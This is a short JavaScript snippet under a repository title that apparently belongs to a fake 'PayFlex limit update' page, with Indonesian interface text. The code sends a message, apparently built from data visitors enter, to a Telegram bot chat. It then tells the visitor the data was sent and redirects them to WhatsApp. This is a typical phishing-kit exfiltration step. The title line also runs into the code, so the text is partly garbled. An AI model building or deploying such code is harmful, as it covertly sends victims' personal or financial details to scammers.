# https-github.com-oficialptptn2-lab-boostpayflexupdatelimfetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
  method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({
    chat_id: CHAT_ID,
    text: pesan
  })
})
.then(res => {
  if(!res.ok){
    throw new Error("Telegram gagal");
  }
  document.getElementById("status").innerHTML="✅ Data berhasil dikirim";
  setTimeout(()=>{
    // PILIH SALAH SATU REDIRECT
    // WhatsApp:
    window.location.href="https://wa.me/628123456789";

    // ATAU Telegram:
    // window.location.href="https://t.me/username_telegram_kamu";
  },1200);
})
.catch(err=>{
  document.getElementById("status").innerHTML="❌ Gagal mengirim data. Silakan coba lagi.";
});
